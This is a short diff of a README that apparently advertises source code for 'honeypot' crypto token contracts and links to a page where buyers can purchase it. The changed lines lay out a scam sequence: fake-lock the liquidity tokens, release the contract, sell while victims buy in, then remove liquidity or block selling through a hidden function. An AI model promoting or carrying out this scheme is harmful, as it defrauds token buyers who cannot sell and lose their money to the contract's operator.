@@ -11,7 +11,7 @@ This is the source code for multiple versions of honeypot contracts that are con
 -   Lock LP Tokens (Fake Lock using DxSale?)
 -   Release Contract
 -   Start Selling while People are Buying In
--   Remove LP
+-   Remove LP or just block sell with function activation
 
 ## How to buy?
 Automatically here: https://enzypt.io/lLQZBfJt2x4Yuggd2iBjCRYkRCchSXpl/v08SDveq2epBHrz7MK5I2staUskd6rY_KagTwRMgAq8
